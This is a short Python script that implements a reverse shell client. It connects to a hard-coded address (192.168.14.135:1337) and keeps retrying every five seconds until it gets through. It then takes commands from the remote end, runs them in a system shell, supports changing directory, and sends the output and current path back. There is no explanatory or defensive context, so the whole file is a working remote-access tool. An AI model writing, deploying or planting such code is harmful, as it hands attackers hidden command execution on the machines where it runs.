import os
import socket
import subprocess
import time


def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.14.135'
        port = 1337
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation have failed" + str(msg))


def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print('Socket connection failed' + str(msg))
        time.sleep(5)
        socket_connect()


def recive_command():
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode("utf-8") == 'exit':
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_string = str(output_bytes, "utf-8")
                s.send(str.encode(output_string + str(os.getcwd()) + '> '))
                print(output_string)
            except:
                output_string = 'Command no Found' + '\n'
                s.send(str.encode(output_string + str(os.getcwd()) + '> '))
                print(output_string)
    s.close()


def main():
    global s
    try:
        socket_create()
        socket_connect()
        recive_command()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()


main()
